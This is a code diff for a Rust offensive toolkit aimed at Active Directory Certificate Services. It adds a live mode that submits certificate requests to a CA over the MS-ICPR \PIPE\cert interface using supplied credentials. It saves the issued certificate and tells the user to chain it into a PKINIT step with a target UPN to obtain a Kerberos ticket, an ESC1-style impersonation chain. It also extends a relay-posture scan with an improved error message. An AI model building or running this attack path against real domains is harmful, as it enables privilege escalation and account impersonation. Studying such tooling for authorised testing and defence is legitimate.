@@ -494,6 +494,19 @@ struct CertipyArgs {
     /// override for lab-only testing when the LDAP fetch is unavailable.
     #[arg(long)]
     schema_version: Option<i32>,
+    /// CA host or IP for live submission via sealed \PIPE\cert. If omitted
+    /// the command runs offline (writes CSR + stub only, no submit).
+    #[arg(long)]
+    host: Option<String>,
+    /// NetBIOS domain for the sealed bind (required when --host is set).
+    #[arg(long)]
+    domain: Option<String>,
+    /// Username (required when --host is set).
+    #[arg(long)]
+    user: Option<String>,
+    /// Password (required when --host is set).
+    #[arg(long, default_value = "")]
+    password: String,
 }
 
 #[derive(Parser)]
@@ -3439,8 +3452,26 @@ async fn posture_scan(a: PostureArgs) -> Result<()> {
     // Read the NTDS relay-posture values, scoped so the RRP client releases the SMB session.
     let ntds = "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters";
     let (signing, cbt) = {
-        let mut reg =
-            RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host).await?;
+        let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
+            .await
+            .map_err(|e| {
+                // 0xC00000AC = STATUS_ILLEGAL_FUNCTION → \winreg pipe not exposed, i.e. the
+                // Remote Registry service is stopped/disabled. Very common on hardened DCs
+                // and on fresh Server 2022/2025 installs.
+                let msg = e.to_string();
+                if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
+                    anyhow::anyhow!(
+                        "\\winreg unreachable on {} — the Remote Registry service is stopped or \
+                         disabled (STATUS_ILLEGAL_FUNCTION 0xC00000AC). Start it on the DC \
+                         (`Set-Service RemoteRegistry -StartupType Automatic; Start-Service RemoteRegistry`) \
+                         then rerun. Spooler-only posture still runs without it — but the LDAP \
+                         signing / channel binding values require registry read.",
+                        a.host
+                    )
+                } else {
+                    e.into()
+                }
+            })?;
         let s = reg
             .read_value(ntds, "LDAPServerIntegrity")
             .await
@@ -4689,8 +4720,9 @@ async fn certipy(a: CertipyArgs) -> Result<()> {
         min_ra_signatures: 0,
         raw_security_descriptor: None,
     };
-    let client = ms_icpr::IcprClient::stub(a.ca.clone());
-    let stub = client
+    // Always emit the offline stub so consumers can diff / replay
+    let stub_client = ms_icpr::IcprClient::stub(a.ca.clone());
+    let stub = stub_client
         .marshal_call(&template, &csr)
         .context("ms_icpr::IcprClient::marshal_call")?;
     std::fs::write(&a.out, &stub)?;
@@ -4700,11 +4732,55 @@ async fn certipy(a: CertipyArgs) -> Result<()> {
         stub.len(),
         ms_icpr::CERT_SERVER_REQUEST_OPNUM
     );
-    eprintln!(
-        "[i] live submission over sealed \\PIPE\\cert requires ms-icpr's `network` feature — \
-         disabled in this build. Feed the stub into `attack esc1` or a fuzz/relay harness for \
-         wire replay."
-    );
+
+    // Live submit path — enabled via ms-icpr's `network` feature (default on after
+    // dcerpc 0.2.3 resolver-cycle fix). Requires --host + --domain + --user.
+    if let Some(host) = a.host.as_deref() {
+        let domain = a
+            .domain
+            .as_deref()
+            .ok_or_else(|| anyhow::anyhow!("--domain required when --host is set"))?;
+        let user = a
+            .user
+            .as_deref()
+            .ok_or_else(|| anyhow::anyhow!("--user required when --host is set"))?;
+        eprintln!(
+            "[*] submitting to {} \\\\PIPE\\\\cert (CA={}) as {}\\{}",
+            host, a.ca, domain, user
+        );
+        let mut client =
+            ms_icpr::IcprClient::connect(host, domain, user, &a.password, a.ca.clone())
+                .context("ms_icpr::IcprClient::connect (sealed \\PIPE\\cert)")?;
+        match client.submit_request(&template, &csr) {
+            Ok(issued) => {
+                let cert_path = format!("{}.issued.pem", a.csr_out);
+                std::fs::write(&cert_path, &issued.pem)?;
+                eprintln!(
+                    "[+] cert ISSUED (request_id={}) → {} ({} bytes)",
+                    issued.request_id,
+                    cert_path,
+                    issued.pem.len()
+                );
+                eprintln!(
+                    "[+] chain into `attack pkinit --cert {} --key {}.key.pem --upn {}` to obtain a TGT",
+                    cert_path, a.csr_out, a.target_upn
+                );
+            }
+            Err(e) => {
+                eprintln!("[-] live submit failed: {e}");
+                eprintln!(
+                    "[i] the offline stub is still available at {} for diagnostic / replay",
+                    a.out
+                );
+                return Err(e.into());
+            }
+        }
+    } else {
+        eprintln!(
+            "[i] offline mode — no --host provided. To submit live, add: \
+             --host <CA-fqdn> --domain <NETBIOS> --user <user> --password <pw>"
+        );
+    }
     Ok(())
 }
 
